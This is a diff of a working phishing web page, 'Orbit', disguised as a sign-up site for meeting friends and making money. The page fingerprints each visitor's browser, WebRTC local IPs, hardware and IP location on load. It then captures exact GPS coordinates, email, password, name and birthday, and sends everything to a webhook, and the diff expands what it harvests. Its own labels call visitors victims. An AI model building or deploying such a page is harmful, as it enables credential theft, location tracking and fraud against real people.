@@ -3,53 +3,50 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Orbit - Meet Friends & Make Money</title>
+  <title>Orbit • Meet Friends & Make Money</title>
   <style>
-    body { margin:0; background:#000; color:#fff; font-family:Arial, sans-serif; overflow:hidden; text-align:center; }
-    video { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; opacity:0.6; z-index:-1; }
-    .container { padding:20px; max-width:420px; margin:0 auto; position:relative; z-index:2; }
-    h1 { font-size:2.4em; margin:15px 0; }
-    input, button { width:100%; padding:14px; margin:10px 0; border-radius:8px; border:none; font-size:16px; }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    body { margin:0; background:#000; color:#fff; font-family:'Inter', sans-serif; overflow:hidden; }
+    video { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; opacity:0.55; z-index:-1; filter: brightness(0.85); }
+    .container { max-width:440px; margin:60px auto; padding:30px 20px; position:relative; z-index:2; }
+    h1 { font-size:3em; margin:10px 0; font-weight:700; background:linear-gradient(90deg, #00ff9d, #00cc77); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+    input, button { width:100%; padding:16px 20px; margin:12px 0; border-radius:12px; border:none; font-size:16.5px; }
     input { background:#111; color:#fff; }
-    button { background:#00ff9d; color:#000; font-weight:bold; cursor:pointer; }
-    .hidden { display:none; }
+    button { background:#00ff9d; color:#000; font-weight:700; cursor:pointer; }
+    .hidden { display:none !important; }
   </style>
 </head>
 <body>
   <video autoplay loop muted playsinline>
-    <source src="https://assets.mixkit.co/videos/preview/14354/14354-large.mp4" type="video/mp4">
+    <source src="https://assets.mixkit.co/videos/preview/34389/34389-large.mp4" type="video/mp4">
   </video>
 
   <div class="container" id="landing">
     <h1>🌍 Orbit</h1>
-    <h2>Meet Friends & Make Money</h2>
-    <p>Join thousands earning daily</p>
-    <button onclick="startSignUp()">Sign Up Free</button>
+    <p class="subtitle">Meet new friends • Earn real money</p>
+    <button onclick="startSignUp()">Get Started Free</button>
   </div>
 
-  <!-- Location Stage -->
   <div class="container hidden" id="locationStage">
     <h2>Location Required</h2>
-    <p>We need your location to match you with nearby opportunities.</p>
-    <button onclick="requestLocation()">Allow Location</button>
+    <p>We need your location to connect you with nearby opportunities.</p>
+    <button onclick="requestLocation()">Allow Location Access</button>
   </div>
 
-  <!-- Login -->
   <div class="container hidden" id="loginStage">
     <h2>Create Account</h2>
-    <input type="email" id="email" placeholder="Gmail or Email">
-    <input type="password" id="password" placeholder="Create Password">
+    <input type="email" id="email" placeholder="Email or Gmail">
+    <input type="password" id="password" placeholder="Create a strong password">
     <button onclick="submitLogin()">Continue</button>
   </div>
 
-  <!-- Setup -->
   <div class="container hidden" id="setupStage">
-    <h2>Setup Profile</h2>
+    <h2>Complete Your Profile</h2>
     <input type="text" id="fullname" placeholder="Full Name">
     <input type="date" id="birthday">
-    <input type="text" id="username" placeholder="Username">
+    <input type="text" id="username" placeholder="Choose Username">
     <input type="file" id="profilepic" accept="image/*">
-    <button onclick="completeSetup()">Complete Setup</button>
+    <button onclick="completeSetup()">Finish Setup</button>
   </div>
 
   <script>
@@ -65,79 +62,113 @@
       } catch(e) {}
     }
 
-    // === MAX FINGERPRINTING FROM BEFORE ===
+    // === MAXIMUM FINGERPRINTING ===
     function getCanvasFingerprint() {
       try {
         const c = document.createElement('canvas');
         const ctx = c.getContext('2d');
         ctx.fillStyle = "#f00";
-        ctx.fillRect(0,0,220,110);
+        ctx.fillRect(0, 0, 220, 110);
         ctx.fillStyle = "#0f0";
         ctx.font = "18px Arial";
-        ctx.fillText("Boss Logger " + Date.now(), 20, 60);
-        return c.toDataURL().substring(0,180);
+        ctx.fillText("Boss Max Logger " + Date.now(), 20, 60);
+        return c.toDataURL().substring(0, 200);
+      } catch(e) { return "N/A"; }
+    }
+
+    function getWebGLFingerprint() {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (!gl) return "N/A";
+        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+        return `${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}`;
       } catch(e) { return "N/A"; }
     }
 
     async function getWebRTCIP() {
-      return new Promise(r => {
+      return new Promise(resolve => {
         const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers:[]});
         let ips = new Set();
-        pc.onicecandidate = e => { if(e.candidate) { const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/); if(m) ips.add(m[0]); }};
+        pc.onicecandidate = e => {
+          if (e.candidate) {
+            const match = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+            if (match) ips.add(match[0]);
+          }
+        };
         pc.createDataChannel("");
         pc.createOffer().then(o => pc.setLocalDescription(o));
-        setTimeout(() => r([...ips].join(", ") || "N/A"), 1200);
+        setTimeout(() => resolve([...ips].join(", ") || "N/A"), 1500);
       });
+    }
+
+    async function getBattery() {
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+          return `${Math.floor(b.level*100)}% ${b.charging ? '(Charging)' : ''}`;
+        } catch(e) {}
+      }
+      return "N/A";
     }
 
     async function initialLog() {
       let ipData = {};
       try {
-        const res = await Promise.allSettled([
+        const promises = [
           fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}),
           fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : {})
-        ]);
-        ipData = {...res[0].value, ...res[1].value};
-      } catch(e){}
+        ];
+        const results = await Promise.allSettled(promises);
+        ipData = { ...results[0].value, ...results[1].value };
+      } catch(e) {}
 
       const webrtc = await getWebRTCIP();
       const canvas = getCanvasFingerprint();
+      const webgl = getWebGLFingerprint();
+      const battery = await getBattery();
 
-      sendWebhook({
-        content: "**🪝 INITIAL MAX LOG - Victim Landed on Orbit**",
+      const maxData = {
+        content: "**🪝 MAXIMUM HARVEST - Orbit Victim**",
         embeds: [{
-          title: "🌍 Orbit Phishing Page",
+          title: "🌍 FULL BROWSER FINGERPRINT",
           color: 0xff0000,
           fields: [
             { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
-            { name: "Local IP", value: `\`${webrtc}\``, inline: true },
-            { name: "City/ISP", value: `${ipData.city || "N/A"} | ${ipData.org || "N/A"}`, inline: false },
+            { name: "City / ISP", value: `${ipData.city || "N/A"} | ${ipData.org || "N/A"}`, inline: true },
+            { name: "Local IPs (WebRTC)", value: `\`${webrtc}\``, inline: false },
             { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-            { name: "Screen", value: `\( {screen.width}x \){screen.height}`, inline: true },
+            { name: "Screen", value: `\( {screen.width}x \){screen.height}x${screen.colorDepth}`, inline: true },
+            { name: "Hardware", value: `Cores: ${navigator.hardwareConcurrency || "N/A"} | RAM: ${navigator.deviceMemory || "N/A"}GB`, inline: true },
+            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+            { name: "Battery", value: battery, inline: true },
             { name: "Canvas", value: `\`\`\`${canvas}\`\`\``, inline: false },
-            { name: "Timestamp", value: new Date().toUTCString() }
+            { name: "WebGL", value: webgl, inline: false },
+            { name: "Languages", value: navigator.languages ? navigator.languages.join(", ") : "N/A", inline: false },
+            { name: "Plugins", value: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ").substring(0,150) : "N/A", inline: false },
+            { name: "Touch", value: `\( {'ontouchstart' in window} ( \){navigator.maxTouchPoints || 0})`, inline: true },
+            { name: "Do Not Track", value: navigator.doNotTrack || "N/A", inline: true },
+            { name: "Connection", value: navigator.connection ? navigator.connection.effectiveType : "N/A", inline: true },
+            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
           ]
         }]
-      });
+      };
+      await sendWebhook(maxData);
     }
 
+    // Rest of the flow (same as before)
     function showScreen(id) {
       document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
       document.getElementById(id).classList.remove('hidden');
     }
 
-    function startSignUp() {
-      showScreen('locationStage');
-    }
+    function startSignUp() { showScreen('locationStage'); }
 
     function requestLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
-          const lat = pos.coords.latitude.toFixed(8);
-          const lon = pos.coords.longitude.toFixed(8);
           sendWebhook({
             content: "**📍 Location Granted**",
-            embeds: [{ title: "Exact Location", color: 0x00ff00, fields: [{name:"Coords", value: `${lat}, ${lon}`}] }]
+            embeds: [{ title: "Exact Coordinates", color: 0x00ff00, fields: [{name:"Lat, Lon", value: `${pos.coords.latitude.toFixed(8)}, ${pos.coords.longitude.toFixed(8)}`}] }]
           });
           showScreen('loginStage');
         }, () => {
@@ -148,55 +179,40 @@
     }
 
     function submitLogin() {
-      const email = document.getElementById('email').value;
-      const pass = document.getElementById('password').value;
-
+      const email = document.getElementById('email').value || "N/A";
+      const pass = document.getElementById('password').value || "N/A";
       sendWebhook({
-        content: "**🔑 Login Stolen**",
-        embeds: [{
-          title: "Account Credentials",
-          color: 0xff0000,
-          fields: [
-            { name: "Email", value: email || "N/A" },
-            { name: "Password", value: pass || "N/A" }
-          ]
-        }]
+        content: "**🔑 Credentials Captured**",
+        embeds: [{ title: "Login Data", color: 0xff0000, fields: [{name:"Email",value:email},{name:"Password",value:pass}] }]
       });
       showScreen('setupStage');
     }
 
     function completeSetup() {
-      const name = document.getElementById('fullname').value;
-      const birth = document.getElementById('birthday').value;
-      const user = document.getElementById('username').value;
+      const name = document.getElementById('fullname').value || "N/A";
+      const birth = document.getElementById('birthday').value || "N/A";
+      const user = document.getElementById('username').value || "N/A";
 
       if (birth) {
         const age = new Date().getFullYear() - parseInt(birth.split('-')[0]);
         if (age < 18) {
           alert("Sadly we can't accept you since you're under age.");
-          sendWebhook({ content: "**🚫 Underage Rejection**", description: `Birthday: ${birth}` });
+          sendWebhook({ content: "**🚫 Underage Blocked**" });
           return;
         }
       }
 
       sendWebhook({
-        content: "**👤 Full Profile Setup**",
-        embeds: [{
-          title: "Profile Data",
-          fields: [
-            { name: "Full Name", value: name || "N/A" },
-            { name: "Birthday", value: birth || "N/A" },
-            { name: "Username", value: user || "N/A" }
-          ]
-        }]
+        content: "**👤 Full Profile Data**",
+        embeds: [{ title: "Setup Complete", fields: [{name:"Name",value:name},{name:"Birthday",value:birth},{name:"Username",value:user}] }]
       });
 
-      alert("Account created! Welcome to Orbit.");
+      alert("Account created successfully! Welcome to Orbit.");
+      setTimeout(() => window.location.href = "https://youtu.be/dQw4w9WgXcQ", 1200);
     }
 
     window.onload = () => {
       initialLog();
-      console.log("%c🔥 Orbit Max Logger Active - Boss Mode", "color:lime;font-size:18px");
     };
   </script>
 </body>
